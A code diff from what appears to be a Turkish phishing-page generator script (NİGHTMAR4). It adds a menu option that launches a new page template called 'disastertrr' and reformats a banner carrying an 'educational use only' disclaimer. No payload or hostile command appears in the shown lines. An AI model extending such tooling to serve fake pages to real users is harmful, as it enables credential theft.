@@ -188,6 +188,12 @@ server="create"
 createpage
 start
 
+elif [[ $option == 99 ]]; then
+server="disastertrr"
+createpage
+start
+
+
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
 menu
@@ -213,10 +219,11 @@ fi
 banner() {
 
 
-printf "     \e[101m\e[1;77m:: Sorumluluk Reddi Beyanı: Geliştiriciler Hiçbir Sorumluluk Üstlenmez!   ::\e[0m\n"
+printf "     \e[101m\e[1;77m:: Sorumluluk Reddi Beyanı: Geliştiriciler Hiçbir Sorumluluk Üstlenmez!  ::\e[0m\n"
 printf "     \e[101m\e[1;77m:: Her Hangi Bir Yanlış Kullanımda 'SecreTNigtmar4' Sorumlu Değildir.  ::\e[0m\n"
-printf "     \e[101m\e[1;77m:: Sadece Eğitim Amaçlı Kullanın!!                     ::\e[0m\n"
-printf "     \e[101m\e[1;77m:: VARLIĞIM TÜRK VARLIĞINA ARMAĞAN OLSUN! = İletişim İnstagram : @byyozzi   ::\e[0m\n"
+printf "     \e[101m\e[1;77m:: Sadece Eğitim Amaçlı Kullanın!! ::\e[0m\n"
+printf "     \e[101m\e[1;77m:: VARLIĞIM TÜRK VARLIĞINA ARMAĞAN OLSUN! 🇹🇷 ::\e[0m\n"
+printf "     \e[101m\e[1;77m:: İletişim = İnstagram : @byyozzi  ::\e[0m\n" 
 printf "\n"
 printf "     \e[101m\e[1;77m::     NİGHTMAR4 v1.5! By @SecreTNightmar4 & @kodadisecret     ::\e[0m\n"
 printf "\n"
